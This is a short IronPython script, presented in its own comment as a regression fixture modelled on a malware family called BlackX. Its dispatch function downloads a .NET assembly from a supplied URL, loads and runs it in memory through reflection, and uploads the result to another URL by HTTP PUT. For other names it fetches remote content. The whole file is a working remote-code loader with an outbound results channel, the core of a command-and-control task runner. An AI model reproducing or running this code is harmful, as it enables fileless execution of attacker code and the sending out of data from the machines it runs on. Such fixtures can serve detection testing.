import json
import sys
import clr
from System import Array, Byte, Object, String
from System.IO import File
from System.Net import WebClient
from System.Reflection import Assembly

# Source-only regression fixture: caller supplies real provider listing/content URLs.
# The opaque suffix values and managed entry-point names deliberately differ from BlackX.
def dispatch(name, content_url, result_url):
    client = WebClient()
    if name.endswith(".plugin"):
        result = Assembly.Load(client.DownloadData(content_url)).GetType("Tasks.Worker").GetMethod("Run").Invoke(None, Array[Object]([Array[String](sys.argv)]))
        client.UploadString(result_url, "PUT", str(result))
    elif name.endswith(".collect"):
        return client.DownloadString(content_url)
    return None
